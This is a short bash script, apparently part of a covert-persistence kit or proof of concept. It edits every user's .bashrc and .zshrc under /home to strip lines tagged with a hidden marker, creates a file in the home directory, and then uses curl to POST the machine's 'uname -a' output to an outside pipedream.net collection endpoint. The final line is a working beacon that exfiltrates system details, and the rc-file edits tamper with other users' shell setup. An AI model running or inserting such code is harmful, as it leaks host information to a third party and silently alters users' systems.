#!/bin/bash

function uninstall_in_rc() {
    if ! [ -f "$1" ]; then
        return
    fi
    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && mv "$1.h1dD3Nbak" "$1"
}

for user in `find /home/ -maxdepth 1 -type d`; do
    uninstall_in_rc "$user/.bashrc"
    uninstall_in_rc "$user/.zshrc"
done

touch ~/hello
uname -a | curl https://enj7fhiwooawt.x.pipedream.net/ -X POST -d "$(</dev/stdin)"
